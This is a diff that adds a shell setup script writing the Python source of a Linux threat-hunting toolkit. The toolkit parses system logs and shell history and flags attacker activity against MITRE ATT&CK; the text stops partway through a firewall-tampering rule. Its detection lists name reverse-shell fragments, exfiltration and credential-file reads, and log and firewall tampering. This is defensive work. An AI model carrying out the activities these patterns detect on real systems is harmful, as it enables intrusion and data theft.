@@ -1,0 +1,1756 @@
+#!/bin/bash
+# LTHT Setup Script - Run this in your cloned repo directory
+# Usage: bash setup_ltht.txt
+# This creates all project files for the LTHT GitHub repo
+
+echo "Setting up LTHT project files..."
+
+mkdir -p sample_logs
+
+# ---- run_hunt.py ----
+cat > run_hunt.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+LTHT - Linux Threat Hunt Toolkit
+==================================
+Automated Linux log analyzer with MITRE ATT&CK mapping.
+Parses auth.log, syslog, bash_history, and cron logs to detect IOCs,
+map findings to ATT&CK techniques, and generate professional reports.
+
+Usage:
+    python run_hunt.py --log-dir sample_logs/
+    python run_hunt.py --log-dir /var/log/ --output report.html
+    python run_hunt.py --log-dir sample_logs/ --json-only
+    python run_hunt.py --log-dir sample_logs/ --html-only --quiet
+
+Author: Larry Odeyemi
+License: MIT
+"""
+
+import argparse
+import sys
+import os
+import time
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from log_parser import parse_all_logs
+from detection_engine import run_all_detections
+from mitre_mapper import map_all_findings, get_attack_summary
+from report_generator import generate_html_report, generate_json_report
+
+
+def _print_banner():
+    print(r"""
+  _   _____ _  _ _____
+ | | |_   _| || |_   _|
+ | |__ | | | __ | | |
+ |____||_| |_||_| |_|
+
+  Linux Threat Hunt Toolkit
+  Automated IOC Detection & MITRE ATT&CK Mapping
+""")
+
+
+def _severity_bar(label: str, count: int, total: int, color_code: str):
+    bar_len = 20
+    pct = (count / total * 100) if total > 0 else 0
+    filled = int(pct / 100 * bar_len)
+    bar = "\u2588" * filled + "\u2591" * (bar_len - filled)
+    print(f"    {label:<12} {bar} {count:>3} ({pct:>5.1f}%)")
+
+
+def _print_summary(findings: list, attack_summary: dict, parsed_logs: dict):
+    total = len(findings)
+    critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+    high = sum(1 for f in findings if f.get("severity") == "HIGH")
+    medium = sum(1 for f in findings if f.get("severity") == "MEDIUM")
+    low = sum(1 for f in findings if f.get("severity") == "LOW")
+    total_risk = sum(f.get("risk_score", 0) for f in findings)
+
+    print(f"  Log Entries Analyzed:  {parsed_logs.get('total_entries', 0)}")
+    print(f"  Files Parsed:         {', '.join(parsed_logs.get('files_parsed', []))}")
+    print()
+    print(f"  Total Findings:       {total}")
+    print(f"  Aggregate Risk Score: {total_risk}")
+    print()
+
+    print("  Severity Breakdown:")
+    _severity_bar("CRITICAL", critical, total, "red")
+    _severity_bar("HIGH", high, total, "orange")
+    _severity_bar("MEDIUM", medium, total, "yellow")
+    _severity_bar("LOW", low, total, "green")
+    print()
+
+    print(f"  MITRE ATT&CK Coverage:")
+    print(f"    Techniques Observed: {attack_summary.get('techniques_observed', 0)}")
+    print(f"    Tactics Observed:    {attack_summary.get('tactics_observed', 0)}")
+    print()
+
+    tactic_breakdown = attack_summary.get("tactic_breakdown", {})
+    if tactic_breakdown:
+        print("  Tactic Breakdown:")
+        for tactic, count in tactic_breakdown.items():
+            print(f"    {tactic:<35} {count} finding(s)")
+        print()
+
+    # Top findings
+    if findings:
+        print("  Top Findings:")
+        for f in findings[:5]:
+            sev = f.get("severity", "?")
+            name = f.get("rule_name", "Unknown")
+            risk = f.get("risk_score", 0)
+            techs = ", ".join(t["id"] for t in f.get("mitre_techniques", []))
+            print(f"    [{sev:>8}] {name:<45} Risk: {risk:>3}  ATT&CK: {techs}")
+        print()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="LTHT - Linux Threat Hunt Toolkit: Automated IOC detection with MITRE ATT&CK mapping",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--log-dir", "-d", required=True, help="Path to directory containing log files")
+    parser.add_argument("--output", "-o", default=None, help="Output file path (base name)")
+    parser.add_argument("--json-only", action="store_true", help="Generate JSON report only")
+    parser.add_argument("--html-only", action="store_true", help="Generate HTML report only")
+    parser.add_argument("--quiet", "-q", action="store_true", help="Suppress console output")
+
+    args = parser.parse_args()
+
+    if not args.quiet:
+        _print_banner()
+
+    # Validate input
+    if not os.path.isdir(args.log_dir):
+        print(f"  Error: Log directory not found: {args.log_dir}")
+        sys.exit(1)
+
+    # Phase 1: Parse logs
+    if not args.quiet:
+        print(f"  Parsing logs in: {args.log_dir}")
+
+    start = time.time()
+    parsed_logs = parse_all_logs(args.log_dir)
+    parse_time = time.time() - start
+
+    if parsed_logs["total_entries"] == 0:
+        print("  Warning: No log entries found. Ensure the directory contains")
+        print("  supported files: auth.log, syslog, bash_history, cron.log")
+        sys.exit(1)
+
+    if not args.quiet:
+        print(f"  Parsed {parsed_logs['total_entries']} entries in {parse_time:.3f}s")
+
+    # Phase 2: Run detections
+    if not args.quiet:
+        print("  Running detection engine...")
+
+    start = time.time()
+    findings = run_all_detections(parsed_logs)
+    detect_time = time.time() - start
+
+    if not args.quiet:
+        print(f"  Detection completed in {detect_time:.3f}s — {len(findings)} finding(s)")
+
+    # Phase 3: Map to MITRE ATT&CK
+    if not args.quiet:
+        print("  Mapping to MITRE ATT&CK framework...")
+
+    findings = map_all_findings(findings)
+    attack_summary = get_attack_summary(findings)
+
+    # Phase 4: Print summary
+    if not args.quiet:
+        print()
+        _print_summary(findings, attack_summary, parsed_logs)
+
+    # Phase 5: Generate reports
+    base_name = args.output or "ltht_report"
+    if base_name.endswith(".html") or base_name.endswith(".json"):
+        base_name = base_name.rsplit(".", 1)[0]
+
+    if not args.json_only:
+        html_path = f"{base_name}.html"
+        generate_html_report(findings, attack_summary, parsed_logs, html_path)
+        if not args.quiet:
+            print(f"  HTML report saved: {html_path}")
+
+    if not args.html_only:
+        json_path = f"{base_name}.json"
+        generate_json_report(findings, attack_summary, parsed_logs, json_path)
+        if not args.quiet:
+            print(f"  JSON report saved: {json_path}")
+
+    if not args.quiet:
+        print()
+        print("  Hunt complete. Open the HTML report in a browser to review findings.")
+        print()
+
+
+if __name__ == "__main__":
+    main()
+PYEOF
+
+cat > log_parser.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+LTHT - Log Parser Module
+=========================
+Parses common Linux log files: auth.log, syslog, bash_history, cron logs.
+Normalizes entries into structured records for the detection engine.
+"""
+
+import re
+import os
+from datetime import datetime
+
+# ---------- auth.log patterns ----------
+AUTH_FAILED = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+sshd\[\d+\]:\s+"
+    r"Failed password for (?:invalid user )?(?P<user>\S+)\s+from\s+(?P<src_ip>[\d.]+)"
+)
+AUTH_ACCEPTED = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+sshd\[\d+\]:\s+"
+    r"Accepted (?:password|publickey) for (?P<user>\S+)\s+from\s+(?P<src_ip>[\d.]+)"
+)
+SUDO_CMD = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+sudo:\s+"
+    r"(?P<user>\S+)\s+:.*COMMAND=(?P<command>.+)"
+)
+SU_ATTEMPT = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+su\[\d+\]:\s+"
+    r"(?P<status>Successful|FAILED) su for (?P<target_user>\S+) by (?P<user>\S+)"
+)
+SESSION_OPENED = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+.*session opened for user (?P<user>\S+)"
+)
+
+# ---------- syslog patterns ----------
+SYSLOG_SERVICE = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+systemd\[\d+\]:\s+"
+    r"(?P<action>Started|Stopped|Starting|Stopping)\s+(?P<service>.+)\."
+)
+SYSLOG_KERNEL = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+kernel:\s+\[\s*[\d.]+\]\s+(?P<message>.+)"
+)
+SYSLOG_GENERIC = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+(?P<process>\S+?)(?:\[\d+\])?:\s+(?P<message>.+)"
+)
+
+# ---------- cron patterns ----------
+CRON_ENTRY = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+(?:CRON|crontab)\[\d+\]:\s+"
+    r"\((?P<user>\S+)\)\s+CMD\s+\((?P<command>.+)\)"
+)
+CRON_EDIT = re.compile(
+    r"(?P<timestamp>\w{3}\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+crontab\[\d+\]:\s+"
+    r"\((?P<user>\S+)\)\s+(?P<action>LIST|REPLACE|DELETE)"
+)
+
+# ---------- bash_history suspicious commands ----------
+SUSPICIOUS_CMDS = [
+    "nc ", "ncat ", "netcat ", "nmap ", "/dev/tcp/", "/dev/udp/",
+    "bash -i", "python -c", "python3 -c", "perl -e", "ruby -e",
+    "wget ", "curl ", "chmod +s", "chmod 4755", "chmod u+s",
+    "useradd", "usermod", "passwd ", "chpasswd",
+    "iptables -F", "iptables --flush", "ufw disable",
+    "history -c", "shred ", "rm -rf /var/log",
+    "cat /etc/shadow", "cat /etc/passwd",
+    "whoami", "id ", "uname -a", "ifconfig", "ip addr",
+    "find / -perm", "find / -writable", "find / -name",
+    "base64 ", "xxd ", "openssl enc",
+    "crontab -e", "at ", "systemctl enable",
+    "ssh-keygen", "authorized_keys",
+    "tcpdump ", "wireshark", "tshark",
+    "mount ", "dd if=", "mkfs",
+    "insmod ", "modprobe ", "rmmod ",
+]
+
+
+def _normalize_timestamp(raw: str, year: int = None) -> str:
+    """Convert syslog-style timestamp to ISO format string."""
+    if year is None:
+        year = datetime.now().year
+    try:
+        dt = datetime.strptime(f"{year} {raw}", "%Y %b %d %H:%M:%S")
+        return dt.isoformat()
+    except ValueError:
+        return raw
+
+
+def parse_auth_log(filepath: str) -> list:
+    """Parse auth.log and return structured log entries."""
+    entries = []
+    if not os.path.isfile(filepath):
+        return entries
+
+    with open(filepath, "r", errors="replace") as f:
+        for line_no, line in enumerate(f, 1):
+            line = line.strip()
+            if not line:
+                continue
+
+            m = AUTH_FAILED.search(line)
+            if m:
+                entries.append({
+                    "source_file": "auth.log",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "ssh_failed_login",
+                    "user": m.group("user"),
+                    "src_ip": m.group("src_ip"),
+                    "raw": line,
+                })
+                continue
+
+            m = AUTH_ACCEPTED.search(line)
+            if m:
+                entries.append({
+                    "source_file": "auth.log",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "ssh_accepted_login",
+                    "user": m.group("user"),
+                    "src_ip": m.group("src_ip"),
+                    "raw": line,
+                })
+                continue
+
+            m = SUDO_CMD.search(line)
+            if m:
+                entries.append({
+                    "source_file": "auth.log",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "sudo_command",
+                    "user": m.group("user"),
+                    "command": m.group("command").strip(),
+                    "raw": line,
+                })
+                continue
+
+            m = SU_ATTEMPT.search(line)
+            if m:
+                entries.append({
+                    "source_file": "auth.log",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "su_attempt",
+                    "user": m.group("user"),
+                    "target_user": m.group("target_user"),
+                    "status": m.group("status").lower(),
+                    "raw": line,
+                })
+                continue
+
+            m = SESSION_OPENED.search(line)
+            if m:
+                entries.append({
+                    "source_file": "auth.log",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "session_opened",
+                    "user": m.group("user"),
+                    "raw": line,
+                })
+
+    return entries
+
+
+def parse_syslog(filepath: str) -> list:
+    """Parse syslog and return structured log entries."""
+    entries = []
+    if not os.path.isfile(filepath):
+        return entries
+
+    with open(filepath, "r", errors="replace") as f:
+        for line_no, line in enumerate(f, 1):
+            line = line.strip()
+            if not line:
+                continue
+
+            m = SYSLOG_SERVICE.search(line)
+            if m:
+                entries.append({
+                    "source_file": "syslog",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "service_action",
+                    "action": m.group("action").lower(),
+                    "service": m.group("service"),
+                    "raw": line,
+                })
+                continue
+
+            m = SYSLOG_KERNEL.search(line)
+            if m:
+                entries.append({
+                    "source_file": "syslog",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "kernel_message",
+                    "message": m.group("message"),
+                    "raw": line,
+                })
+                continue
+
+            m = SYSLOG_GENERIC.search(line)
+            if m:
+                entries.append({
+                    "source_file": "syslog",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "syslog_generic",
+                    "process": m.group("process"),
+                    "message": m.group("message"),
+                    "raw": line,
+                })
+
+    return entries
+
+
+def parse_bash_history(filepath: str) -> list:
+    """Parse bash_history and flag suspicious commands."""
+    entries = []
+    if not os.path.isfile(filepath):
+        return entries
+
+    with open(filepath, "r", errors="replace") as f:
+        for line_no, line in enumerate(f, 1):
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+
+            is_suspicious = any(cmd in line.lower() for cmd in [c.lower().strip() for c in SUSPICIOUS_CMDS])
+
+            entries.append({
+                "source_file": "bash_history",
+                "line_number": line_no,
+                "event_type": "command_executed",
+                "command": line,
+                "suspicious": is_suspicious,
+                "raw": line,
+            })
+
+    return entries
+
+
+def parse_cron_log(filepath: str) -> list:
+    """Parse cron log and return structured entries."""
+    entries = []
+    if not os.path.isfile(filepath):
+        return entries
+
+    with open(filepath, "r", errors="replace") as f:
+        for line_no, line in enumerate(f, 1):
+            line = line.strip()
+            if not line:
+                continue
+
+            m = CRON_ENTRY.search(line)
+            if m:
+                entries.append({
+                    "source_file": "cron",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "cron_execution",
+                    "user": m.group("user"),
+                    "command": m.group("command").strip(),
+                    "raw": line,
+                })
+                continue
+
+            m = CRON_EDIT.search(line)
+            if m:
+                entries.append({
+                    "source_file": "cron",
+                    "line_number": line_no,
+                    "timestamp": _normalize_timestamp(m.group("timestamp")),
+                    "host": m.group("host"),
+                    "event_type": "cron_edit",
+                    "user": m.group("user"),
+                    "action": m.group("action").lower(),
+                    "raw": line,
+                })
+
+    return entries
+
+
+def parse_all_logs(log_dir: str) -> dict:
+    """Parse all log files in a directory and return categorized results."""
+    results = {
+        "auth": [],
+        "syslog": [],
+        "bash_history": [],
+        "cron": [],
+        "total_entries": 0,
+        "files_parsed": [],
+    }
+
+    file_map = {
+        "auth.log": ("auth", parse_auth_log),
+        "syslog": ("syslog", parse_syslog),
+        "bash_history": ("bash_history", parse_bash_history),
+        ".bash_history": ("bash_history", parse_bash_history),
+        "cron.log": ("cron", parse_cron_log),
+        "cron_log": ("cron", parse_cron_log),
+    }
+
+    for filename, (category, parser_func) in file_map.items():
+        filepath = os.path.join(log_dir, filename)
+        if os.path.isfile(filepath):
+            parsed = parser_func(filepath)
+            results[category].extend(parsed)
+            results["files_parsed"].append(filename)
+
+    results["total_entries"] = sum(
+        len(results[k]) for k in ["auth", "syslog", "bash_history", "cron"]
+    )
+
+    return results
+PYEOF
+
+cat > detection_engine.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+LTHT - Detection Engine
+========================
+IOC detection rules for common Linux attack patterns.
+Each rule evaluates parsed log entries and produces findings with severity and risk scores.
+"""
+
+from collections import Counter, defaultdict
+
+
+# ---------------------------------------------------------------------------
+# Detection helpers
+# ---------------------------------------------------------------------------
+
+def _group_by_key(entries: list, key: str) -> dict:
+    """Group a list of dicts by a given key."""
+    groups = defaultdict(list)
+    for e in entries:
+        groups[e.get(key, "unknown")].append(e)
+    return groups
+
+
+# ---------------------------------------------------------------------------
+# Detection rules
+# ---------------------------------------------------------------------------
+
+def detect_brute_force(auth_entries: list, threshold: int = 5) -> list:
+    """Detect SSH brute force attempts — multiple failed logins from same IP."""
+    findings = []
+    failed = [e for e in auth_entries if e["event_type"] == "ssh_failed_login"]
+    by_ip = _group_by_key(failed, "src_ip")
+
+    for ip, attempts in by_ip.items():
+        if len(attempts) >= threshold:
+            users_targeted = list(set(a.get("user", "unknown") for a in attempts))
+            first = attempts[0].get("timestamp", "unknown")
+            last = attempts[-1].get("timestamp", "unknown")
+
+            severity = "CRITICAL" if len(attempts) >= 20 else "HIGH"
+            risk = min(100, len(attempts) * 5)
+
+            findings.append({
+                "rule_id": "LTHT-BF-001",
+                "rule_name": "SSH Brute Force Detected",
+                "severity": severity,
+                "risk_score": risk,
+                "description": (
+                    f"Detected {len(attempts)} failed SSH login attempts from {ip} "
+                    f"targeting user(s): {', '.join(users_targeted[:5])}"
+                ),
+                "source_ip": ip,
+                "attempt_count": len(attempts),
+                "users_targeted": users_targeted,
+                "first_seen": first,
+                "last_seen": last,
+                "evidence": [a["raw"] for a in attempts[:5]],
+                "recommendation": (
+                    "Block the source IP via firewall rules. Implement fail2ban or "
+                    "similar rate-limiting. Enforce key-based SSH authentication. "
+                    "Review accounts for unauthorized access."
+                ),
+            })
+
+    return findings
+
+
+def detect_brute_force_success(auth_entries: list, threshold: int = 5) -> list:
+    """Detect successful login after brute force — failed logins followed by accepted."""
+    findings = []
+    failed = [e for e in auth_entries if e["event_type"] == "ssh_failed_login"]
+    accepted = [e for e in auth_entries if e["event_type"] == "ssh_accepted_login"]
+
+    failed_ips = _group_by_key(failed, "src_ip")
+    accepted_ips = _group_by_key(accepted, "src_ip")
+
+    for ip in set(failed_ips) & set(accepted_ips):
+        if len(failed_ips[ip]) >= threshold:
+            findings.append({
+                "rule_id": "LTHT-BF-002",
+                "rule_name": "Successful Login After Brute Force",
+                "severity": "CRITICAL",
+                "risk_score": 95,
+                "description": (
+                    f"IP {ip} had {len(failed_ips[ip])} failed attempts then successfully "
+                    f"authenticated. Likely credential compromise."
+                ),
+                "source_ip": ip,
+                "failed_count": len(failed_ips[ip]),
+                "successful_logins": [a["raw"] for a in accepted_ips[ip][:3]],
+                "evidence": [a["raw"] for a in failed_ips[ip][:3]] + [a["raw"] for a in accepted_ips[ip][:2]],
+                "recommendation": (
+                    "Immediately investigate the authenticated session. Reset credentials "
+                    "for affected user(s). Check for persistence mechanisms (SSH keys, "
+                    "cron jobs, new user accounts). Block the source IP."
+                ),
+            })
+
+    return findings
+
+
+def detect_privilege_escalation(auth_entries: list) -> list:
+    """Detect privilege escalation via sudo abuse and su attempts."""
+    findings = []
+
+    # Failed su attempts
+    su_failed = [e for e in auth_entries if e["event_type"] == "su_attempt" and e.get("status") == "failed"]
+    if su_failed:
+        by_user = _group_by_key(su_failed, "user")
+        for user, attempts in by_user.items():
+            findings.append({
+                "rule_id": "LTHT-PE-001",
+                "rule_name": "Failed Privilege Escalation (su)",
+                "severity": "HIGH",
+                "risk_score": 70,
+                "description": (
+                    f"User '{user}' made {len(attempts)} failed su attempt(s) to escalate privileges."
+                ),
+                "user": user,
+                "attempt_count": len(attempts),
+                "evidence": [a["raw"] for a in attempts[:5]],
+                "recommendation": (
+                    "Review the user's activity and access permissions. Check for "
+                    "lateral movement. Restrict su access via /etc/pam.d/su."
+                ),
+            })
+
+    # Suspicious sudo commands
+    sudo_entries = [e for e in auth_entries if e["event_type"] == "sudo_command"]
+    suspicious_sudo_patterns = [
+        "chmod +s", "chmod 4755", "useradd", "usermod", "passwd",
+        "visudo", "/etc/shadow", "bash", "/bin/sh", "chown root",
+        "iptables", "ufw", "systemctl", "rm -rf",
+    ]
+    for entry in sudo_entries:
+        cmd = entry.get("command", "").lower()
+        matched = [p for p in suspicious_sudo_patterns if p in cmd]
+        if matched:
+            findings.append({
+                "rule_id": "LTHT-PE-002",
+                "rule_name": "Suspicious Sudo Command",
+                "severity": "HIGH" if "shadow" in cmd or "chmod +s" in cmd else "MEDIUM",
+                "risk_score": 75 if "shadow" in cmd or "chmod +s" in cmd else 55,
+                "description": (
+                    f"User '{entry.get('user', 'unknown')}' executed suspicious sudo command: "
+                    f"{entry.get('command', 'unknown')}"
+                ),
+                "user": entry.get("user", "unknown"),
+                "command": entry.get("command", "unknown"),
+                "matched_patterns": matched,
+                "evidence": [entry["raw"]],
+                "recommendation": (
+                    "Validate the command was authorized. Review sudoers configuration. "
+                    "Implement least-privilege sudo policies."
+                ),
+            })
+
+    return findings
+
+
+def detect_reverse_shells(history_entries: list) -> list:
+    """Detect reverse shell indicators in bash history."""
+    findings = []
+    shell_patterns = [
+        ("bash -i", "Bash interactive reverse shell"),
+        ("/dev/tcp/", "Bash /dev/tcp reverse shell"),
+        ("/dev/udp/", "Bash /dev/udp reverse shell"),
+        ("nc -e", "Netcat reverse shell with -e flag"),
+        ("ncat -e", "Ncat reverse shell"),
+        ("nc -c", "Netcat reverse shell with -c flag"),
+        ("python -c 'import socket", "Python reverse shell"),
+        ("python3 -c 'import socket", "Python3 reverse shell"),
+        ("perl -e 'use Socket", "Perl reverse shell"),
+        ("ruby -e", "Ruby reverse shell"),
+        ("mkfifo", "Named pipe reverse shell"),
+    ]
+
+    for entry in history_entries:
+        cmd = entry.get("command", "")
+        for pattern, label in shell_patterns:
+            if pattern.lower() in cmd.lower():
+                findings.append({
+                    "rule_id": "LTHT-RS-001",
+                    "rule_name": "Reverse Shell Detected",
+                    "severity": "CRITICAL",
+                    "risk_score": 100,
+                    "description": f"{label} detected in command history: {cmd[:120]}",
+                    "command": cmd,
+                    "pattern_matched": pattern,
+                    "evidence": [entry["raw"]],
+                    "recommendation": (
+                        "IMMEDIATE ACTION REQUIRED. Investigate the host for active "
+                        "C2 connections. Isolate the system. Perform memory forensics. "
+                        "Check for data exfiltration and lateral movement."
+                    ),
+                })
+                break
+
+    return findings
+
+
+def detect_reconnaissance(history_entries: list) -> list:
+    """Detect reconnaissance commands in bash history."""
+    findings = []
+    recon_patterns = [
+        ("nmap ", "Network scanner execution"),
+        ("whoami", "User identity enumeration"),
+        ("id ", "User/group ID enumeration"),
+        ("uname -a", "System information gathering"),
+        ("cat /etc/passwd", "Password file enumeration"),
+        ("cat /etc/shadow", "Shadow file access attempt"),
+        ("ifconfig", "Network interface enumeration"),
+        ("ip addr", "Network address enumeration"),
+        ("find / -perm", "SUID/permission search"),
+        ("find / -writable", "Writable directory search"),
+        ("find / -name", "File system enumeration"),
+        ("netstat ", "Network connection enumeration"),
+        ("ss -", "Socket statistics enumeration"),
+        ("ps aux", "Process enumeration"),
+        ("lsof ", "Open file enumeration"),
+    ]
+
+    recon_cmds = []
+    for entry in history_entries:
+        cmd = entry.get("command", "")
+        for pattern, label in recon_patterns:
+            if pattern.lower() in cmd.lower():
+                recon_cmds.append((entry, pattern, label))
+                break
+
+    if len(recon_cmds) >= 3:
+        findings.append({
+            "rule_id": "LTHT-RC-001",
+            "rule_name": "Reconnaissance Activity Cluster",
+            "severity": "HIGH",
+            "risk_score": 70,
+            "description": (
+                f"Detected {len(recon_cmds)} reconnaissance commands in bash history, "
+                f"indicating systematic enumeration of the target system."
+            ),
+            "command_count": len(recon_cmds),
+            "commands": [c[0]["command"] for c in recon_cmds[:10]],
+            "evidence": [c[0]["raw"] for c in recon_cmds[:5]],
+            "recommendation": (
+                "Investigate who executed these commands and whether they had "
+                "authorization. Review for follow-on exploitation activity. "
+                "Implement command logging and alerting."
+            ),
+        })
+    elif recon_cmds:
+        for entry, pattern, label in recon_cmds:
+            findings.append({
+                "rule_id": "LTHT-RC-002",
+                "rule_name": f"Reconnaissance: {label}",
+                "severity": "MEDIUM",
+                "risk_score": 40,
+                "description": f"{label} detected: {entry['command'][:120]}",
+                "command": entry["command"],
+                "evidence": [entry["raw"]],
+                "recommendation": "Review command context and user authorization.",
+            })
+
+    return findings
+
+
+def detect_persistence(cron_entries: list, history_entries: list) -> list:
+    """Detect persistence mechanisms — suspicious cron jobs, authorized_keys, etc."""
+    findings = []
+
+    # Suspicious cron commands
+    suspicious_cron = [
+        "curl ", "wget ", "python", "bash ", "/tmp/", "nc ", "ncat ",
+        "/dev/tcp", "base64", "chmod", "reverse", "shell",
+    ]
+    for entry in cron_entries:
+        if entry["event_type"] == "cron_execution":
+            cmd = entry.get("command", "").lower()
+            matched = [p for p in suspicious_cron if p in cmd]
+            if matched:
+                findings.append({
+                    "rule_id": "LTHT-PS-001",
+                    "rule_name": "Suspicious Cron Job",
+                    "severity": "CRITICAL" if any(p in cmd for p in ["/dev/tcp", "reverse", "nc "]) else "HIGH",
+                    "risk_score": 90 if any(p in cmd for p in ["/dev/tcp", "reverse", "nc "]) else 65,
+                    "description": (
+                        f"Suspicious cron job executed by '{entry.get('user', 'unknown')}': "
+                        f"{entry.get('command', 'unknown')[:120]}"
+                    ),
+                    "user": entry.get("user", "unknown"),
+                    "command": entry.get("command", "unknown"),
+                    "matched_patterns": matched,
+                    "evidence": [entry["raw"]],
+                    "recommendation": (
+                        "Review the cron job for malicious intent. Check crontab for "
+                        "unauthorized entries (crontab -l -u <user>). Remove suspicious "
+                        "entries and investigate the source."
+                    ),
+                })
+
+    # Crontab modifications
+    cron_edits = [e for e in cron_entries if e["event_type"] == "cron_edit" and e.get("action") == "replace"]
+    for entry in cron_edits:
+        findings.append({
+            "rule_id": "LTHT-PS-002",
+            "rule_name": "Crontab Modified",
+            "severity": "MEDIUM",
+            "risk_score": 50,
+            "description": f"Crontab modified by user '{entry.get('user', 'unknown')}'.",
+            "user": entry.get("user", "unknown"),
+            "evidence": [entry["raw"]],
+            "recommendation": "Verify the crontab modification was authorized. Audit new entries.",
+        })
+
+    # authorized_keys manipulation in bash history
+    for entry in history_entries:
+        cmd = entry.get("command", "").lower()
+        if "authorized_keys" in cmd:
+            findings.append({
+                "rule_id": "LTHT-PS-003",
+                "rule_name": "SSH Authorized Keys Manipulation",
+                "severity": "CRITICAL",
+                "risk_score": 90,
+                "description": f"SSH authorized_keys manipulation detected: {entry['command'][:120]}",
+                "command": entry["command"],
+                "evidence": [entry["raw"]],
+                "recommendation": (
+                    "Audit all authorized_keys files on the system. Remove unauthorized "
+                    "keys. Investigate for backdoor SSH access."
+                ),
+            })
+
+    return findings
+
+
+def detect_log_tampering(history_entries: list, syslog_entries: list) -> list:
+    """Detect log clearing and tampering activity."""
+    findings = []
+
+    tamper_patterns = [
+        ("history -c", "Bash history cleared"),
+        ("history -w /dev/null", "Bash history redirected to /dev/null"),
+        ("shred ", "File shredding utility used"),
+        ("rm -rf /var/log", "Log directory deletion attempted"),
+        ("rm /var/log", "Log file deletion attempted"),
+        ("> /var/log", "Log file truncated"),
+        ("truncate ", "File truncation utility used"),
+        ("echo '' > /var/log", "Log file emptied"),
+    ]
+
+    for entry in history_entries:
+        cmd = entry.get("command", "")
+        for pattern, label in tamper_patterns:
+            if pattern.lower() in cmd.lower():
+                findings.append({
+                    "rule_id": "LTHT-LT-001",
+                    "rule_name": "Log Tampering Detected",
+                    "severity": "CRITICAL",
+                    "risk_score": 85,
+                    "description": f"{label}: {cmd[:120]}",
+                    "command": cmd,
+                    "pattern_matched": pattern,
+                    "evidence": [entry["raw"]],
+                    "recommendation": (
+                        "CRITICAL: Anti-forensic activity detected. Preserve all "
+                        "remaining logs immediately. Initiate incident response. "
+                        "Consider the host compromised."
+                    ),
+                })
+                break
+
+    return findings
+
+
+def detect_data_exfiltration(history_entries: list) -> list:
+    """Detect potential data exfiltration commands."""
+    findings = []
+
+    exfil_patterns = [
+        ("curl.*-d ", "Data upload via curl POST"),
+        ("curl.*--data", "Data upload via curl"),
+        ("wget.*--post", "Data upload via wget POST"),
+        ("scp ", "Secure copy to external host"),
+        ("rsync ", "Data sync to external host"),
+        ("base64 ", "Base64 encoding (potential exfil prep)"),
+        ("xxd ", "Hex encoding (potential exfil prep)"),
+        ("tar.*-c.*|.*nc", "Archive piped to netcat"),
+        ("zip.*|.*nc", "Archive piped to netcat"),
+        ("openssl enc", "OpenSSL encryption (potential exfil prep)"),
+    ]
+
+    for entry in history_entries:
+        cmd = entry.get("command", "")
+        for pattern, label in exfil_patterns:
+            if pattern.lower().split(".*")[0] in cmd.lower():
+                findings.append({
+                    "rule_id": "LTHT-EX-001",
+                    "rule_name": "Potential Data Exfiltration",
+                    "severity": "HIGH",
+                    "risk_score": 75,
+                    "description": f"{label}: {cmd[:120]}",
+                    "command": cmd,
+                    "evidence": [entry["raw"]],
+                    "recommendation": (
+                        "Investigate the destination of data transfers. Check for "
+                        "unauthorized data movement. Review DLP controls."
+                    ),
+                })
+                break
+
+    return findings
+
+
+def detect_firewall_tampering(history_entries: list) -> list:
+    """Detect firewall rule modifications."""
+    findings = []
+
+    fw_patterns = [
+        ("iptables -F", "Firewall rules flushed"),
+        ("iptables --flush", "Firewall rules flushed"),
+        ("ufw disable", "UFW firewall disabled"),
+        ("firewalld stop", "Firewalld stopped"),
+        ("systemctl stop firewalld", "Firewalld service stopped"),
+        ("iptables -P.*ACCEPT", "Firewall default policy set to ACCEPT"),
+    ]
+
+    for entry in history_entries:
+        cmd = entry.get("command", "")
+        for pattern, label in fw_patterns:
+            if pattern.lower() in cmd.lower():
+                findings.append({
+                    "rule_id": "LTHT-FW-001",
+                    "rule_name": "Firewall Tampering",
+                    "severity": "CRITICAL",
+                    "risk_score": 85,
+                    "description": f"{label}: {cmd[:120]}",
+                    "command": cmd,
